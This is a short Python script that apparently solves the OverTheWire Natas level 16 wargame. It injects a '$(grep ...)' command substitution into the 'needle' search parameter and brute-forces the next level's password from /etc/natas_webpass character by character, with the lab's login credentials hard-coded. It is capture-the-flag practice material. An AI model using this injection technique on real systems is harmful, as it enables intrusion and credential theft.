
#Blind Command Injecion Script for natas16

import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"


chars = string.ascii_letters + string.digits
password = ""

for x in range(32):
    for y in chars:
        payload = f"Africans$(grep ^{password}{y} /etc/natas_webpass/natas17)"
        url_params = {
        "needle": payload
        }     
        httpresponse = requests.get(url, params=url_params,auth=("natas16","hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"))       
        if "Africans" not in httpresponse.text :
            password += y
            print(password)
            break
        
        #request para payload




